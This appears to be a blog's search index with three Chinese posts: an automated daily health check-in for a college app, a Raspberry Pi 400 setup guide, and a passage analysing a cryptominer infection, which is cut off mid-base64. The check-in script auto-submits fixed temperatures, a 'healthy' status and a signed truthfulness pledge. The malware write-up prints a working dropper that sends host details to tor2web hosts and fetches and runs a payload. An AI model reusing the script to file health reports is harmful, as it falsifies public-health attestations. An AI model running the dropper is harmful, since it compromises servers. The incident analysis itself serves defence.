<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[超详细i至诚app打卡流程分析与自动打卡实现]]></title>
    <url>%2Fposts%2F5a29fa14%2F</url>
    <content type="text"><![CDATA[背景受人之托，分析了一下i至诚app（是由树维公司出的一款套壳app）的打卡流程，并实现了自动化，app版本是v1.1.2，记录一下 开始app下载地址http://www.fdzcxy.edu.cn/ueditor/asp/upload/file/20200305/zcxy_v1_1_2.apk 抓包我使用的工具是fiddler，这个app本质上是一个weex构建的基于vue的套壳app项目，登陆时使用的是okhttp框架 并有一定程度的证书校验，因此抓包时用老办法（hook okhttp）绕过一下，然后局域网下设置好代理之后，就可以抓包了，过程不再赘述 报文分析登陆i至诚使用的是jwt token认证 请求报文如下 123456POST https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login?username=用户名&amp;password=密码 HTTP/1.1Content-Length: 0Host: superapp.fdzcxy.edu.cnConnection: Keep-AliveAccept-Encoding: gzipUser-Agent: okhttp/3.12.1 响应报文如下，登陆成功会返回jwt token，失败会直接403 1234567891011121314HTTP/1.1 200Server: nginx/1.16.1Date: Mon, 19 Jul 2021 07:27:01 GMTContent-Type: text/plain;charset=UTF-8Connection: keep-aliveVary: Accept-EncodingX-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockCache-Control: no-cache, no-store, max-age=0, must-revalidatePragma: no-cacheExpires: 0X-Frame-Options: DENYeyJhbGciOiJSUzUxMiJ9eyJzdWIiOiLlrablj7ciLCJST0xFUyI6IlJPTEVfQURNSU4sYWRtaW5pc3RyYXRvcix1c2VyIiwiY3JlYXRlZCI6MTYyNjY5NjA1NTkzMiwiZXhwIjoxNjI5Mjg4MDU1fS5zaWduYXR1cmU= 这里简单介绍一下jwt（是一种基于token的鉴权机制），jwt token通常由三部分构成，格式是这样的：header.payload.signature 所以上面的响应可以直接解析为： header：声明类型和加密的算法 1&#123;"alg":"RS512"&#125; payload：存放有效信息 123456&#123;"sub": "学号",#subject，标识实体"ROLES": "ROLE_ADMIN,administrator,user","created": 1626696055932,#创建时间"exp": 1629288055,#expire，过期时间&#125; signature：可以理解为签名 1是一串RSA私钥加密之后的密文，由于泄露个人信息，已打码处理 分析登陆时其实可以不用抓包处理，因为树维公司其实提供了文档，链接：https://superapp.fdzcxy.edu.cn/auth-server/doc/index#%E7%99%BB%E5%BD%95 然后文档中还顺带把公钥给我们了，基于此，顺带写了一个验签工具，并把之前抓包的jwt token解密出来了 该工具需要的maven依赖 12345&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt; 工具源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import java.security.Key;import java.security.KeyFactory;import java.security.NoSuchAlgorithmException;import java.security.interfaces.RSAPublicKey;import java.security.spec.InvalidKeySpecException;import java.security.spec.X509EncodedKeySpec;import java.util.Base64;public class Main &#123; public static void main(String[] args) throws InvalidKeySpecException, NoSuchAlgorithmException &#123; getClaimsFromToken("你抓到的jwt token"); &#125; public static RSAPublicKey stringToPublicKey(String publicKeyPem) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; //System.out.println(publicKeyPem); if (publicKeyPem.startsWith("-----BEGIN PUBLIC KEY-----")) &#123; publicKeyPem = publicKeyPem.replaceAll("-----BEGIN PUBLIC KEY-----", ""); &#125; if (publicKeyPem.endsWith("-----END PUBLIC KEY-----")) &#123; publicKeyPem = publicKeyPem.replaceAll("-----END PUBLIC KEY-----", ""); &#125; publicKeyPem = publicKeyPem.replaceAll("\n", ""); //System.out.println(publicKeyPem); X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(Base64.getMimeDecoder().decode(publicKeyPem)); KeyFactory x509KeyFactory = KeyFactory.getInstance("RSA"); RSAPublicKey x509PublicKey = (RSAPublicKey) x509KeyFactory.generatePublic(x509KeySpec); return x509PublicKey; &#125; public static Key getPublicKey() throws InvalidKeySpecException, NoSuchAlgorithmException &#123; String publicKeyPem = "-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBQw6TmvJ+nOuRaLoHsZJGIBzRg/wbskNv6UevL3/nQioYooptPfdIHVzPiKRVT5+DW5+nqzav3DOxY+HYKjO9nFjYdj0sgvRae6iVpa5Ji1wbDKOvwIDNukgnKbqvFXX2Isfl0RxeN3uEKdjeFGGFdr38I3ADCNKFNxtbmfqvjQIDAQAB -----END PUBLIC KEY-----"; Key publicKey = stringToPublicKey(publicKeyPem); return publicKey; &#125; static Claims getClaimsFromToken(String token) throws InvalidKeySpecException, NoSuchAlgorithmException &#123; Key publicKey = getPublicKey(); Claims claims; try &#123; claims = Jwts.parser().setSigningKey(publicKey).parseClaimsJws(token).getBody(); System.out.println(claims); &#125; catch (Exception e) &#123; e.printStackTrace(); claims = null; &#125; return claims; &#125;&#125; 解密出来的明文如下：其实就是把payload加密了一下 1&#123;sub=学号, ROLES=ROLE_ADMIN,administrator,user, created=1626696055932, exp=1629288055&#125; 每日健康上报在i至诚app中，除了登陆，几乎其他所有的功能都是用webview加载的vue项目，每日健康上报功能也是这样，而在这些应用中，几乎都没有证书验证，因此可以直接抓包，或者在浏览器中访问，所以这里最简单的方式，当然是无脑的使用自动化测试框架啦（虽然慢是慢点，因为浏览器渲染是一个比较耗时的操作），我并没有采用这种方式，我选择的是直接分析整个流程，然后模拟提交，不依赖浏览器的渲染 大体上有这么几个过程：请求每日健康上报 -&gt; 重定向并获取sessionID -&gt; 激活sessionid -&gt; 获取打卡信息，jsConfId和callbackConfId -&gt; 提交打卡信息 自动化经过上面的分析，最终的成品如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# -*- coding: utf-8 -*-from urllib.parse import quoteimport requestsimport timeimport reusername = '学号'password = '密码'name = '姓名'pattern = re.compile(r'[a-zA-Z0-9]&#123;8&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;12&#125;')def login(): url = 'https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login' headers = &#123; 'Host': 'superapp.fdzcxy.edu.cn', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1', &#125; data = &#123; 'username': username, 'password': password, &#125; res = requests.post(url=url, headers=headers, data=data) # print(res.text) return res.textdef daka(token): # 请求每日健康上报，获取必要的信息 url = 'http://dw10.fdzcxy.edu.cn/datawarn/home/handle.action?redirectUrl=app/yibao.frm' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 SuperApp', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'authorization': 'JWTToken ' + token, 'usertoken': token, 'jwttoken': token, 'X-Requested-With': 'com.lantu.MobileCampus.zcxy', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Cookie': 'userToken=' + token &#125; res = requests.get(url, headers=headers, allow_redirects=False) url = 'http://dw10.fdzcxy.edu.cn/' + res.headers['location'] reffer = url # print(url) # 获取sessionID res = requests.get(url=url, headers=headers) sessionID = pattern.search(res.text)[0] # print(sessionID) # 更新JSESSIONID url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/resources?path=/com/fr/web/core/js/vancharts-all.js&amp;deviceType=iPhone&amp;buildVersion=2020.12.02.10.19.36.340' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', &#125; res = requests.get(url=url, headers=headers) cookie = 'JSESSIONID=' + requests.utils.dict_from_cookiejar(res.cookies)['JSESSIONID'] # print(cookie) # 激活sessionid的必要步骤 url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/url/mobile/view/firstdata?op=h5&amp;cmd=firstdata&amp;userno=' + username + '&amp;token=' + token + '&amp;__parameters__=&#123;&#125;&amp;sessionID=' + sessionID # print(url) headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'responseType': 'json', 'terminal': 'H5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '__device__': 'unknown', 'Accept': 'application/json, text/plain, */*', 'Cache-Control': 'no-cache', 'clientType': 'mobile/h5_5.0', 'deviceType': 'unknown', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', &#125; res = requests.get(url=url, headers=headers) # print(res.text) # 获取打卡信息，jsConfId和callbackConfId url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form?sessionID=' + sessionID + '&amp;op=fr_form&amp;cmd=load_content&amp;toVanCharts=true&amp;fine_api_v_json=3&amp;widgetVersion=1' res = requests.get(url=url, headers=headers) # print(res.text) # 不嫌麻烦的话，可以写一个逻辑构建打卡所需要提交的表单，这里我就偷懒了 items = res.json()['items'][0]['el']['items'] for i in items: if i['widgetName'] == 'SUBMIT': submit = i['listeners'][0]['action'] break # print(submit) jsConfId = pattern.findall(submit)[0] callbackConfId = pattern.findall(submit)[1] # print(jsConfId, callbackConfId) # 提交打卡信息 url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'terminal': 'H5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '__device__': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json, text/plain, */*', 'Cache-Control': 'no-cache', 'sessionID': sessionID, 'clientType': 'mobile/h5_5.0', 'deviceType': 'unknown', 'Origin': 'http://dw10.fdzcxy.edu.cn', 'Referer': reffer, 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': cookie, &#125; data = &#123; 'op': 'dbcommit', '__parameters__': quote( '&#123;"jsConfId":"' + jsConfId + '","callbackConfId":"' + callbackConfId + '","LABEL2":" 每日健康上报","XH":"' + username + '","XM":"' + name + '","LABEL12":"","LABEL0":"1. 目前所在位置:","SHENG":"350000","SHI":"福州市","QU":"鼓楼区","LABEL11":"2.填报时间:","SJ":"' + time.strftime( "%Y-%m-%d %H:%M:%S", time.localtime()) + '","LABEL1":"3. 今日体温是否正常？(体温小于37.3为正常)","TWZC":"正常","LABEL6":"目前体温为：","TW":"0","TXWZ":"350000福州市鼓楼区","LABEL9":"4. 昨日午检体温:","WUJ":"36.4","LABEL8":"5. 昨日晚检体温:","WJ":"36.5","LABEL10":"6. 今日晨检体温:","CJ":"36.4","LABEL3":"7. 今日健康状况？","JK":["健康"],"JKZK":"","QTB":"请输入具体症状：","QT":" ","LABEL4":"8. 近14日你和你的共同居住者(包括家庭成员、共同租住的人员)是否存在确诊、疑似、无症状新冠感染者？","WTSQK":["无以下特殊情况"],"SFXG":"","LABEL5":"9. 今日隔离情况？","GLQK":"无需隔离","LABEL7":"* 本人承诺以上所填报的内容全部真实，并愿意承担相应责任。","CHECK":true,"DWWZ":&#123;&#125;,"SUBMIT":"提交信息"&#125;'), &#125; # print(data) res = requests.post(url=url, headers=headers, data=data) if res.text: return Truedef main_handler(event, context): token = login() # print(token) if daka(token): return 'success'if __name__ == '__main__': print(main_handler(&#123;&#125;, &#123;&#125;)) 依赖 12345certifi==2021.5.30charset-normalizer==2.0.1idna==3.2requests==2.26.0urllib3==1.26.6 挂云函数配置触发器定时执行或者放云服务器设置定时执行就好了 配置触发器参考文档：https://cloud.tencent.com/document/product/583/9708 其他，比如打卡成功后发封邮件提示之类的，就自己发挥了（我懒]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>自动打卡</tag>
        <tag>i至诚</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一份不专业的树梅派400使用指南]]></title>
    <url>%2Fposts%2F7004a632%2F</url>
    <content type="text"><![CDATA[前段时间入手了树梅派400，补一篇使用指南，内容涉及购买建议，安装系统，软件配置，硬件搭配等 树梅派400简介一台键盘一体机，连接电源，鼠标和显示器就可以作为一台生产力工具使用了 购买建议建议购买套装版，否则需要单独自行购买电源等配件，内含：电源，树梅派400一体机，鼠标，高速sd卡，读卡器以及micro-HDMI连接线等 硬件搭配 显示器：建议搭配一台带有扬声器的显示器，否则需要外接蓝牙音箱或者usb声卡，不然没声音 外设：如果你有做图像相关需求的话，可以搭配一个USB摄像头（有套装版是包含这个的） 安装系统个人觉得官方推荐的Raspberry Pi OS不好用，我更喜欢ubantu系统，然后使用了一段时间的ubantu-desktop感觉太重了，树梅派400的硬件跑起来有点难顶，所以这里我推荐使用ubantu-mate，更轻 准备 sd卡，读卡器 Win32DiskImager，下载地址：https://win32diskimager.download/download-win32-disk-imager/ ubantu-mate镜像，下载地址：https://ubuntu-mate.org/download/arm64/groovy/ ，选择Direct Download即可 烧录插入读卡器，打开Win32DiskImager，选择你解压好的镜像，write即可 开机插入刻录好的sd卡，连接电源，鼠标，显示器（连接到靠近电源的micro-hdmi口），进入系统，完成系统初始设置，连接网络，然后更新一下系统（否则蓝牙适配器不可用） 系统配置 卸载掉超级不好用的snap，打开终端，输入命令sudo apt autoremove snapd 解决睡眠之后唤醒不了的问题 安装laptop-mode-tools工具包，输入命令sudo apt install laptop-mode-tools 修改配置文件，输入命令sudo gedit /etc/laptop-mode/laptop-mode.conf 将ENABLE_LAPTOP_MODE_TOOLS,ENABLE_LAPTOP_MODE_ON_BATTERY,ENABLE_LAPTOP_MODE_ON_AC,ENABLE_LAPTOP_MODE_WHEN_LID_CLOSED四项的值都设置为1 启动laptop_mode,输入命令sudo laptop_mode start 设置启用hdmi音频，修改文件/boot/firmware/config.txt，把#hdmi_drive=2 修改为 hdmi_drive=2，然后重启系统（也可以只重启一次系统） 配置默认声卡 插入usb声卡 aplay -l 查看系统所有声卡 修改文件/boot/firmware/config.txt，把dtparam=audio=on 修改为 #dtparam=audio=on，禁用板载声卡，树梅派400是没有这个东西的，禁用后重启系统默认声卡不会复原 新增文件/etc/asount.conf，内容为：下面的2,是你上面查看到的所有声卡中，你想设置为默认声卡的那个编号 123defaults.ctl.card 2defaults.pcm.card 2defaults.timer.card 2 软件配置开机初始化完成系统之后，如果你选择的语言是中文，那么需要安装一下完整的语言支持包，否则界面大部分还是英文的，也没有中文输入法 安装完整的中文语言支持包打开设置-&gt;个人偏好-&gt;语言支持，安装，会同时安装好中文输入法，切换的快捷键是ctrl + space（空格） 安装必备的软件请注意树梅派系列的产品cpu架构是arm的（树梅派400是arm64），因此需要安装对应架构的软件才能跑 浏览器，系统自带的firefox浏览器我认为不好用，我更喜欢chrome，但是巧的是chrome没有编译好的arm版本可供下载，这时候有两种选择，一是自己下载源代码配置好相关环境之后编译安装，二是安装ubantu源里面的chromium，这里我选择二，给出一个安装脚本,首先访问：http://ports.ubuntu.com/pool/universe/c/chromium-browser/ 确定一下当前最新的版本是多少，然后把版本填到下面的脚本的第一行，把它保存为一个文件，赋予执行权限，执行即可 12345678910111213141516171819version=91.0.4472.101sudo apt autoremove snapd#echo $versionwget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debwget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.deb# 支持播放B站视频wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb sudo dpkg -i chromium-browser_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debsudo dpkg -i chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.debrm chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb rm chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb rm chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debrm chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.debrm chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.deb （未完待续）]]></content>
      <categories>
        <category>树梅派</category>
      </categories>
      <tags>
        <tag>树梅派400</tag>
        <tag>使用指南</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次帮师兄解决服务器挖矿木马的过程]]></title>
    <url>%2Fposts%2Fe2d5f670%2F</url>
    <content type="text"><![CDATA[背景最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程 现象 首先是某云服务器控制台给出了性能受限警告 分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马 然后是网站（个人博客）无法访问 分析：这张图片看起来像阿里cdn禁止访问的图片，因此分析应该是套了一层cdn，禁止直接使用ip访问，后期经过验证，果然如此，使用域名是可以访问的，但是出现了css样式加载不出来的问题，我猜大概率是因为https证书过期了，一些内容无法经过cdn加载出来，希望师兄尽快去处理一下 进一步分析经过上面的分析，网站挂马应该是不存在的，不过也不排除是网站漏洞导致反弹了shell，从而被挂上木马的（建议师兄仔细看一下后台有没有鉴权或者未授权访问漏洞以及远程代码执行漏洞，尤其是文件上传的接口部分，更要仔细排查），为什么我会得出这样的结论呢？因为我把他的网站源码down了下来，使用某web扫描引擎，扫描了一遍，结论是没有发现明显的木马，我自己也大概的扫了一下，确实是没有明显的跳转到其他链接和其他比较明显的木马文件之类的。所以，接下来就只剩这个疑似中了挖矿木马的情况了 破局定位木马首先使用top命令，查看一下当前的CPU占用情况 可以看到aLZmFuXY这个进程一直在占用着CPU的资源，很明显就是罪魁祸首 于是尝试，全局搜索一下看看，执行 1find / -iname aLZmFuXY 好吧，看来不是这么明显的，什么都没有搜到 然后，尝试直接kill掉这个进程试试，先执行 1ps -ef | grep aLZmFuXY 定位到进程，然后执行 1kill -9 6283 尝试杀掉进程，没想到，直接断开了ssh连接，看来这个木马还有点顽固，猜想肯定有某种重启或者定时执行的机制 于是，重新蓝（连）上ssh，再次查看CPU使用情况 果不其然，它（aLZmFuXY）又回来（自动启动）了 现在我们尝试去搞懂木马的启动机制，经过上面的分析和实验，我们可以知道，这个挖矿的木马程序应该是有自启动和重启机制的，于是，我们可以从这里入手，使用 1crontab -l 查看所有的定时任务，发现只有一个/root/.systemd-service.sh，那铁定就是它在捣鬼，等等，好像有什么细节被我们忽略了？？？想不起来，先放一下（其实是在top命令的执行结果那里，捣蛋鬼systemd总是和我们的木马进程aLZmFuXY一起出现的） 现在我们来看一下，这个捣蛋鬼脚本到底写了什么，执行 1cat /root/.systemd-service.sh 发现是一堆base64编码之后的脚本，我们尝试解码看看 12345678910111213141516171819202122232425262728293031323334353637nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVexec &amp;&gt;/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo &quot;curl -4fsSLkA- -m200&quot;)t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)sockz() &#123;n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)&#125;fexe() &#123;for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done&#125;u() &#123;sockzf=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x&#125;for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su doif ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; thenfexe;u $t.$hls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)elsebreakfidone 好了，有了源代码的佐证，现在我们终于可以确定，这个捣蛋鬼就是一个活生生的挖矿木马，别问我怎么确定的（tor2web都出来了，这还不够明显吗？？？） 附上源文件： 1234#!/bin/bashexec &amp;&gt;/dev/nullecho nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVecho blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash 现在我们来仔细分析一下/root/.systemd-service.sh这个文件的内容（当然是解码之后的内容啦，没解码谁看得懂。。。），不过，要说声抱歉的是，shell我也不懂，就看懂个大概吧（大佬勿喷），大概就是监测挖矿进程是否在线，在线就一直连接socket，一直挖，一直挖，不在线就利用守护进程去启动它，然后还是一直挖，一直挖，一直挖。。。着实有点过分，怪不得那么吃资源，这简直丧心病狂。不得不提的是，脚本中有一个目录很值得我们注意一下，就是/tmp/.X11-unix/，这个就是挖矿进程和守护进程所在的地方，我们去看一下，执行 1ls -la /tmp/.X11-unix/ 可以看到，有三个文件，查看这三个文件（01、11、22）的内容可以看到是几个数字，功能如下： 01文件存放木马守护进程pid 11文件存放木马运行进程pid 22为一个空文件，功能暂时不清楚 分析就到这里了，下面是解决木马篇 干掉木马为了防止分析过程有所疏忽，有必要再次进行一下全局搜索，执行 12find / -iname systemd-service.shfind / -iname .systemd-service.sh 果然，我们有所遗漏，/opt/systemd-service.sh这就是我们之前没有发现的，现在我们来看一下它又是什么，执行 1cat /opt/systemd-service.sh 好吧，又是一个base64编码之后的东西，看起来，套路都一样呢？惊得我直呼一声好家伙 源文件： 1234#!/bin/bashexec &amp;&gt;/dev/nullecho nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVecho blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9c